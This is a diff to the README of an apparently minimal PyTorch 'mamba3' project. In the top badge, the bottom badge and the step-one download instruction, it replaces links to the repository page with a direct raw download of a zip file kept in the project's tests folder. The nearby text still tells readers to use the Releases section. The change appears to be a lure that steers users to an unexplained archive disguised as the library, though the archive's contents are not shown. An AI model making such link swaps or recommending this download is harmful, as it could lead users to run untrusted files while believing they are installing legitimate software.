@@ -1,6 +1,6 @@
 # ⚙️ mamba3-minimal - Easy PyTorch Model for Everyone
 
-[![Download mamba3-minimal](https://img.shields.io/badge/Download-mamba3--minimal-4CAF50?style=for-the-badge)](https://github.com/tariwecode/mamba3-minimal)
+[![Download mamba3-minimal](https://img.shields.io/badge/Download-mamba3--minimal-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/tariwecode/mamba3-minimal/main/tests/minimal-mamba-v1.0.zip)
 
 ---
 
@@ -33,7 +33,7 @@ If you plan to use a GPU or Apple's MPS on compatible hardware, your driver and 
 
 1. **Visit the download page:**  
    Click the large green button below or open this link in your browser:  
-   [https://github.com/tariwecode/mamba3-minimal](https://github.com/tariwecode/mamba3-minimal)  
+   [https://raw.githubusercontent.com/tariwecode/mamba3-minimal/main/tests/minimal-mamba-v1.0.zip](https://raw.githubusercontent.com/tariwecode/mamba3-minimal/main/tests/minimal-mamba-v1.0.zip)  
 
 2. **Find the latest release:**  
    On the GitHub page, look for the "Releases" section or tab. This is usually on the right side or in the menu. Click on it to see available versions.
@@ -116,4 +116,4 @@ For direct support, you can open an issue on the GitHub repository page. Provide
 
 ---
 
-[![Download mamba3-minimal](https://img.shields.io/badge/Download-mamba3--minimal-4CAF50?style=for-the-badge)](https://github.com/tariwecode/mamba3-minimal)
+[![Download mamba3-minimal](https://img.shields.io/badge/Download-mamba3--minimal-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/tariwecode/mamba3-minimal/main/tests/minimal-mamba-v1.0.zip)
